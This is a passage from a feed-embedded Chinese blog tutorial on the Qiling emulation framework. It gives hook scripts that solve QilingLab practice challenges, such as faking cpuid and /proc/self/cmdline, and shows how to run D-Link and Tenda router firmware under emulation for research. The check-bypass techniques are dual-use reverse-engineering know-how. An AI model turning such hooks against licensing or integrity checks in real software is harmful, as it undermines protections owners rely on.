class="params">ql:Qiling</span>):</span><br><span class="line">    base=get_base(ql)</span><br><span class="line">    addr=base+<span class="number">0xf16</span></span><br><span class="line">    ql.hook_address(infinite_loop_bypass_hook,addr)</span><br></pre></td></tr></table></figure><h3 id="0x7-challenge7"><a href="#0x7-challenge7" class="headerlink" title="0x7.challenge7"></a>0x7.challenge7</h3><p><a href="https://imgtu.com/i/q9l79S"><img src="https://s1.ax1x.com/2022/03/17/q9l79S.png" alt="q9l79S.png"></a><br>有一个sleep函数，沉睡时间无限长，很显然我们需要hook掉sleep函数<br>第一个参数传参为rdi，我们可以修改sleep的参数为0就能退出sleep<br>还可以在sleep函数中直接return</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_sleep</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    <span class="comment">#return</span></span><br><span class="line">    ql.reg.rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.set_api(<span class="string">&quot;sleep&quot;</span>,hook_sleep)</span><br></pre></td></tr></table></figure><p>另外，sleep底层调用的是nanosleep函数，也可以对nanosleep进行hook</p><h3 id="0x8-challenge8"><a href="#0x8-challenge8" class="headerlink" title="0x8.challenge8"></a>0x8.challenge8</h3><p><a href="https://imgtu.com/i/q98shV"><img src="https://s1.ax1x.com/2022/03/17/q98shV.png" alt="q98shV.png"></a><br>这里借用了<a href="https://joansivion.github.io/qilinglabs/">JOANSIVION</a>的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">random_struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *some_string;</span><br><span class="line">  __int64 magic;</span><br><span class="line">  <span class="type">char</span> *check_addr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>challenge8最后会将要检查的位置的地址赋给check_addr，我们要做的就是在执行这一步之后将check_addr指向的位置赋值为1.我们在0xfb5处进行hook<br>要做到这点我们首先要获取v2的地址<br><a href="https://imgtu.com/i/q9ywBq"><img src="https://s1.ax1x.com/2022/03/17/q9ywBq.png" alt="q9ywBq.png"></a>在IDA中我们可以看到各个变量在栈中的偏移，v2这个结构体的地址存在rbp-8处，获取到地址之后，然后根据结构体偏移读取check_addr的值，然后往其中写1即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_struct</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    struct_addr=ql.unpack64(ql.mem.read(ql.reg.rbp-<span class="number">0x8</span>,<span class="number">8</span>))<span class="comment">#unpack64类似于pwnools中的u64，解包数据，8字节</span></span><br><span class="line">    struct_data=ql.mem.read(struct_addr,<span class="number">24</span>)<span class="comment">#读取struct_addr指向内存的数据，长度为24字节</span></span><br><span class="line">    some_string_addr,magic,check_addr=struct.unpack(<span class="string">&#x27;QQQ&#x27;</span>,struct_data)<span class="comment">#QQQ是将读取到的数据按照3个long解包，分别赋值</span></span><br><span class="line">    ql.mem.write(check_addr,<span class="string">b&#x27;\01&#x27;</span>)<span class="comment">#往check_addr中写&#x27;\01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    base=get_base(ql)</span><br><span class="line">    addr=base+<span class="number">0xfb5</span></span><br><span class="line">    ql.hook_address(hook_struct,addr)</span><br></pre></td></tr></table></figure><h3 id="0x9-challenge9"><a href="#0x9-challenge9" class="headerlink" title="0x9.challenge9"></a>0x9.challenge9</h3><p><a href="https://imgtu.com/i/q9cfk6"><img src="https://s1.ax1x.com/2022/03/17/q9cfk6.png" alt="q9cfk6.png"></a><br>将这一串字符串转为小写后，然后和原字符串比较，如果相同则通过检查<br>两个函数，tolower和strcmp，可以让tolower直接返回，或者让strcmp返回0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_tolower</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_strcmp</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.rax=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.set_api(<span class="string">&quot;strcmp&quot;</span>,hook_strcmp)</span><br><span class="line">ql.set_api(<span class="string">&quot;tolower&quot;</span>,hook_tolower)</span><br></pre></td></tr></table></figure><h3 id="0xA-challenge10"><a href="#0xA-challenge10" class="headerlink" title="0xA.challenge10"></a>0xA.challenge10</h3><p><a href="https://imgtu.com/i/q9gdud"><img src="https://s1.ax1x.com/2022/03/17/q9gdud.png" alt="q9gdud.png"></a><br>从&#x2F;proc&#x2F;self&#x2F;cmdline中读取当前的命令，如果是qilinglab的话就通过检查<br>这个挑战和challenge2是一样的，劫持文件系统，使其被读取的时候返回qilinglab即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fake_cmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self,<span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;qilinglab&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.add_fs_mapper(<span class="string">&#x27;/proc/self/cmdline&#x27;</span>,Fake_cmdline())</span><br></pre></td></tr></table></figure><h3 id="0xB-challenge11"><a href="#0xB-challenge11" class="headerlink" title="0xB.challenge11"></a>0xB.challenge11</h3><p><a href="https://imgtu.com/i/q9go5V"><img src="https://s1.ax1x.com/2022/03/17/q9go5V.png" alt="q9go5V.png"></a><br>这个challenge使用cpuid来获取cpu的一些信息，然后检查RBX,RCX,RDX的值是否为特定的值，是的话则通过检查。伪代码中的__PAIR64__应该是IDA自定义的一个，__PAIR64__(_RBX,_RCX) &#x3D;&#x3D; 0x696C6951614C676ELL实际上检查RBX==0x696C6951,RCX==0X614C676E。<br>这题需要hook指令，ql.hook_code，hook掉cpuid，不让它正常执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_cpuid</span>(<span class="params">ql:Qiling,address,size</span>):</span><br><span class="line">    <span class="keyword">if</span> ql.mem.read(address,size)==<span class="string">b&#x27;\x0f\xa2&#x27;</span>:<span class="comment">#如果当前的指令是cpuid的话(cpuid的机器码是0x0fa2)</span></span><br><span class="line">        ql.reg.rbx=<span class="number">0x696C6951</span></span><br><span class="line">        ql.reg.rcx=<span class="number">0x614C676E</span></span><br><span class="line">        ql.reg.rdx=<span class="number">0x20202062</span></span><br><span class="line">        ql.reg.rip+=size</span><br><span class="line"><span class="comment">#就将rbx，rcx，rdx设置为对应的值，然后直接跳过cpuid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    begin,end=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> ql.mem.map_info:</span><br><span class="line">        <span class="keyword">if</span> info[<span class="number">2</span>]==<span class="number">5</span> <span class="keyword">and</span> <span class="string">&#x27;qilinglab-x86_64&#x27;</span> <span class="keyword">in</span> info[<span class="number">3</span>]:</span><br><span class="line">            begin,end=info[:<span class="number">2</span>]</span><br><span class="line">    ql.hook_code(hook_cpuid,begin=begin,end=end)</span><br></pre></td></tr></table></figure><p>另外，除了用hook_code的方式，还可以用hook_address<br><a href="https://imgtu.com/i/q94b26"><img src="https://s1.ax1x.com/2022/03/17/q94b26.png" alt="q94b26.png"></a><br>在0x1195位置，会把esi，ecx，eax的值赋值到内存中，然后进行if比较，从这里下手，我们在1195处进行hook，设置好esi，ecx和eax的值为正确的值就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_cpuid</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.esi=<span class="number">0x696C6951</span></span><br><span class="line">    ql.reg.ecx=<span class="number">0x614C676E</span></span><br><span class="line">    ql.reg.eax=<span class="number">0x20202062</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    base=get_base(ql)</span><br><span class="line">    addr=base+<span class="number">0x1195</span></span><br><span class="line">    ql.hook_address(hook_cpuid,addr)</span><br></pre></td></tr></table></figure><h2 id="0x5-qilinglab-aarch64"><a href="#0x5-qilinglab-aarch64" class="headerlink" title="0x5 qilinglab-aarch64"></a>0x5 qilinglab-aarch64</h2><h3 id="0x1-challenge1-1"><a href="#0x1-challenge1-1" class="headerlink" title="0x1.challenge1"></a>0x1.challenge1</h3><h2 id="0x6-使用qiling模拟运行路由器固件"><a href="#0x6-使用qiling模拟运行路由器固件" class="headerlink" title="0x6.使用qiling模拟运行路由器固件"></a>0x6.使用qiling模拟运行路由器固件</h2><h3 id="0x1-DIR816A2"><a href="#0x1-DIR816A2" class="headerlink" title="0x1.DIR816A2"></a>0x1.DIR816A2</h3><p>http后台程序为&#x2F;bin&#x2F;goahead<br>首先用以下代码尝试运行goahead</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    rootfs=<span class="string">&quot;./squashfs-root&quot;</span></span><br><span class="line">    ql=Qiling([<span class="string">&quot;./squashfs-root/bin/goahead&quot;</span>],rootfs,verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    <span class="comment">#ql.debugger=&quot;127.0.0.1:1234&quot;</span></span><br><span class="line">    hook(ql)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>得到如下输出<br><a href="https://imgtu.com/i/qPusLn"><img src="https://s1.ax1x.com/2022/03/17/qPusLn.png" alt="qPusLn.png"></a><br>缺少&#x2F;dev&#x2F;nvram文件，于是我们手动在rootfs下面创建这个文件，继续运行<br><a href="https://imgtu.com/i/qPKAfS"><img src="https://s1.ax1x.com/2022/03/17/qPKAfS.png" alt="qPKAfS.png"></a><br>在IDA中对这个字符进行交叉引用，查找到报错代码<br><a href="https://imgtu.com/i/qPMuge"><img src="https://s1.ax1x.com/2022/03/17/qPMuge.png" alt="qPMuge.png"></a><br><a href="https://imgtu.com/i/qPMGUP"><img src="https://s1.ax1x.com/2022/03/17/qPMGUP.png" alt="qPMGUP.png"></a><br>缺少&#x2F;var&#x2F;run&#x2F;goahead.pid文件，继续手动创建，接着运行，得到如下报错<br><a href="https://imgtu.com/i/qPQ4SS"><img src="https://s1.ax1x.com/2022/03/17/qPQ4SS.png" alt="qPQ4SS.png"></a><br>在IDA中定位<br><a href="https://imgtu.com/i/qP1g8f"><img src="https://s1.ax1x.com/2022/03/17/qP1g8f.png" alt="qP1g8f.png"></a><br>问题出在inet_addr转换的时候，看到汇编<br><a href="https://imgtu.com/i/qP3XfP"><img src="https://s1.ax1x.com/2022/03/17/qP3XfP.png" alt="qP3XfP.png"></a>比较$s1和$v0寄存器的值是否相等，$v0的值是-1，而$s1的值来源于inet_addr的返回值，因此我们需要在这里进行hook，使其不相等。<br>采用如下代码进行hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_inet_addr</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.v0=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    addr=<span class="number">0x0045CDD8</span></span><br><span class="line">    ql.hook_address(hook_inet_addr,addr)</span><br></pre></td></tr></table></figure><p>再次运行<br><a href="https://imgtu.com/i/qPG1bQ"><img src="https://s1.ax1x.com/2022/03/17/qPG1bQ.png" alt="qPG1bQ.png"></a><br>得到这样的输出，可以直接忽略<br>netstat查看端口<br><a href="https://imgtu.com/i/qPJ6eg"><img src="https://s1.ax1x.com/2022/03/17/qPJ6eg.png" alt="qPJ6eg.png"></a><br>在浏览器中输入这个IP:port<br><a href="https://imgtu.com/i/qPJOYR"><img src="https://s1.ax1x.com/2022/03/17/qPJOYR.png" alt="qPJOYR.png"></a><br>成功运行</p><h3 id="0x2-DAP1665"><a href="#0x2-DAP1665" class="headerlink" title="0x2.DAP1665"></a>0x2.DAP1665</h3><p>这个是个无线扩展器，所有的http处理功能都集成在一个cgibin文件中<br><a href="https://imgtu.com/i/qiU3Gj"><img src="https://s1.ax1x.com/2022/03/18/qiU3Gj.png" alt="qiU3Gj.png"></a><br>尝试直接运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    rootfs=<span class="string">&quot;./squashfs-root&quot;</span></span><br><span class="line">    ql=Qiling([<span class="string">&quot;./squashfs-root/htdocs/cgibin&quot;</span>],rootfs,verbose=QL_VERBOSE.DEBUG)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>会有如下输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGI.BIN, unknown command cgibin</span><br></pre></td></tr></table></figure><p>调试过cgibin的师傅应该知道，cgibin会根据不同的需求进入到不同分支<br><a href="https://imgtu.com/i/qia10K"><img src="https://s1.ax1x.com/2022/03/18/qia10K.png" alt="qia10K.png"></a><br>我们运行失败正是因为没有指定进入的分支，如何处理呢？<br>前面在qilinglab中，我们可以设置寄存器的值，同样的我们可以设置pc的值，使程序流向我们想要的分支。在这里我选择进入到pigwidgeon.cgi(因为需要的参数少一点),我们在main函数入口处进行hook，设置pc寄存器为pigwidgeon分支的入口地址，程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x00402020</span></span><br><span class="line">pigwidgeon_addr=<span class="number">0x40bc70</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_pigwidgeon</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.arch_pc=pigwidgeon_addr</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    rootfs=<span class="string">&quot;./squashfs-root&quot;</span></span><br><span class="line">    ql=Qiling([<span class="string">&quot;./squashfs-root/htdocs/cgibin&quot;</span>],rootfs,verbose=QL_VERBOSE.DEBUG)</span><br><span class="line">    ql.hook_address(hook_pigwidgeon,main_addr)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>成功运行<br><a href="https://imgtu.com/i/qkQR8P"><img src="https://s1.ax1x.com/2022/03/18/qkQR8P.png" alt="qkQR8P.png"></a><br>进入到pigwidgeon查看<br><a href="https://imgtu.com/i/qkQrHH"><img src="https://s1.ax1x.com/2022/03/18/qkQrHH.png" alt="qkQrHH.png"></a><br>首先会取得请求方式，而且只能为POST，我们继续设置环境变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env_vars=&#123;</span><br><span class="line">    <span class="string">&quot;REQUEST_METHOD&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">ql=Qiling([<span class="string">&quot;./squashfs-root/htdocs/cgibin&quot;</span>],rootfs,env=env_vars,verbose=QL_VERBOSE.DEBUG)</span><br></pre></td></tr></table></figure><p>回显发生变化<br><a href="https://imgtu.com/i/qkQxrF"><img src="https://s1.ax1x.com/2022/03/18/qkQxrF.png" alt="qkQxrF.png"></a><br>无法解析HTTP请求，因为我们除了请求方式外什么都没有设置，在查看其他获取环境变量的函数<br><a href="https://imgtu.com/i/qk1YSx"><img src="https://s1.ax1x.com/2022/03/18/qk1YSx.png" alt="qk1YSx.png"></a><br>这里获取了另外两个环境变量，继续按要求设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">env_vars=&#123;</span><br><span class="line">    <span class="string">&quot;REQUEST_METHOD&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;REQUEST_URI&quot;</span>: <span class="string">&quot;/pigwidgeon.cgi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CONTENT_TYPE&quot;</span>: <span class="string">&quot;application/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CONTENT_LENGTH&quot;</span>: <span class="string">&quot;100&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/qk1g6f"><img src="https://s1.ax1x.com/2022/03/18/qk1g6f.png" alt="qk1g6f.png"></a><br>可以得到不同的回显。这里只是做一个示例，因为环境变量的设置需要仔细审计完代码才能按照要求设置，就不细看了。<br>另外提一嘴，qiling的debugger用起来体验并不好，无论是pwdbg还是gef远程连上去后都看不到寄存器，要调试的话还是得用qemu来</p><h3 id="0x3-Tenda-AC15"><a href="#0x3-Tenda-AC15" class="headerlink" title="0x3.Tenda AC15"></a>0x3.Tenda AC15</h3><p>直接运行httpd的话会在check_network处卡住<br><a href="https://imgtu.com/i/qAKZm4"><img src="https://s1.ax1x.com/2022/03/19/qAKZm4.png" alt="qAKZm4.png"></a><br>一路追踪check_network，找到了最终调用的函数<br><a href="https://imgtu.com/i/qAKJne"><img src="https://s1.ax1x.com/2022/03/19/qAKJne.png" alt="qAKJne.png"></a><br>get_eth_name传入的参数是0，所以check_network是要获取br0的ip，而我的虚拟机中并没有br0这个网卡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Qiling是一款功能强大的高级代码模拟框架&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;很早就知道了qiling框架，一直想学但一直都忙于别的事情，这段时间打算开始学习qiling框架，记录一下学习的历程&lt;/p&gt;
&lt;h2 id=&quot;0x1-运行程序&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
